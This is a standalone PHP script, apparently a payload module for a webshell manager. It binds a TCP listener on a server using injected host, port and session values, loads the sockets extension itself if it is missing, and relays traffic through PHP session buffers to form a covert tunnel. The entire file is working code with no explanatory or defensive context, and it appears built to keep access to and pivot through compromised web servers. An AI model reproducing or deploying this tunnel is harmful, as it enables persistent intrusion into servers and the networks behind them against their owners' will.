<?php
/**
 * global: $rhost, $rport, $sessionid
 * 
 * $ret['code']:
 *      1   成功返回
 *      0   远程无socket库
 *      -1  socket操作失败
 */
ini_set("session.use_trans_sid" ,0);
ini_set("session.use_only_cookies" ,0);
ini_set("session.use_cookies" ,0);
set_time_limit(0);
session_id($sessionid);
$ret = array('code'=>1, 'msg'=>'');
session_start();
$_SESSION['run'] = 0;
$_SESSION['readbuf'] = '';
$_SESSION['writebuf'] = '';
session_write_close();
register_shutdown_function(function(){
    unset($_SESSION);
    session_destroy();
});

if(!extension_loaded('sockets')){
    if(function_exists('dl')){
        $prefix = (PHP_SHLIB_SUFFIX === 'dll')?'php_':'';
        if(!dl($prefix.'sockets'.PHP_SHLIB_SUFFIX)){
            $ret['code'] = 0;
            die(json_encode($ret));
        }
    }else{
        $ret['code'] = 0;
        die(json_encode($ret));
    }
}
if (($server = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    $ret['code'] = -1;
    $ret['msg'] = base64_encode("socket_create() failed: reason: " . socket_strerror(socket_last_error()));
    die(json_encode($ret));
}
if (socket_bind($server, $rhost, $rport) === false) {
    $ret['code'] = -1;
    $ret['msg'] = base64_encode("socket_bind() failed: reason: " . socket_strerror(socket_last_error()));
    die(json_encode($ret));
}
if (socket_listen($server, 1) === false) {
    $ret['code'] = -1;
    $ret['msg'] = base64_encode("socket_listen() failed: reason: " . socket_strerror(socket_last_error()));
    die(json_encode($ret));
}
socket_set_nonblock($server);
while (($sock = socket_accept($server)) === false) {
    session_start();
    $tmp = $_SESSION['run'];
    session_write_close();
    if($tmp !== 0){
        @socket_shutdown($server);
        @socket_close($server);
        die(json_encode($ret));
    }
    usleep(100000);
}
@socket_shutdown($server);
@socket_close($server);
session_start();
$_SESSION['run'] = true;
session_write_close();
socket_set_nonblock($sock);
while($_SESSION['run'] === true){
    $readbuf = '';
    while(true){
        $tmp = socket_read($sock, 1024);
        if($tmp == ''){
            break;
        }
        $readbuf .= $tmp;
    }
    if($readbuf != ''){
        session_start();
        $_SESSION['readbuf'] .= $readbuf;
        session_write_close();
    }

    session_start();
    $writebuf = $_SESSION['writebuf'];
    $_SESSION['writebuf'] = '';
    session_write_close();
    if($writebuf != ''){
        if(socket_write($sock, $writebuf) === false){
            break;
        }
    }
    usleep(100000);
}
@socket_shutdown($sock);
@socket_close($sock);
echo json_encode($ret);